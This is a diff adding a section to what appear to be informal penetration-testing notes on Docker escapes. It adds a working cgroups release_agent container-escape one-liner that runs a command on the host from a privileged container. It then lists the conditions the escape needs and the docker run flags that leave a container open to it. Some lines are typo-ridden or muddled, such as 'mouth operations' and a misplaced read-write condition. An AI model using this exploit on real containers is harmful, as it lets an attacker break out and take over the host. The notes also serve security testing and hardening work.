@@ -24,3 +24,23 @@ Mounted Docker socket
 					//thanks past seld that was a clever one <redacted?> (the world may never know)
 	--moral to the subsection of note: don't trust the security of docker.sock just as Serj said, "Attack Attack Attack!"
 CGROUPS
+	-abuse cgroups release_agent on containers or k8 pods execute with the --privileged flag:
+		d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)` \
+		mkdir -p $d/w;echo 1 >$d/w/notify_on_release \
+		t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab` \
+		touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh \
+		$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
+	-PoC only escapes with narrow set of contraints
+		--executed with root privileges within container (busybox/bash/sh/zsh)
+		--container running with SYS_ADMIN Linux capability
+			--SYS_ADMIN capability allows a container to perform the mount syscall
+				--default Docker profile intializes containers with limited set of capabilities
+					--standard docker linux kernal denies all mouth operations (see next below)
+		--container allows mount syscall
+			--excludes any container with an apparmor profile and most configurations of SELINUX
+				--containers run with docker-default AppArmor policy by default
+		--cgroup v1 virtual filesystem must be mounted read-write within container
+			--prevents the use of the mount syscall even when the container is run with SYS_ADMIN
+		-vulnerable container would be run with, e.g., the following flags
+			docker run --privileged --security-opt apparmor=unconfined --cap-add=SYS_ADMIN
+			--
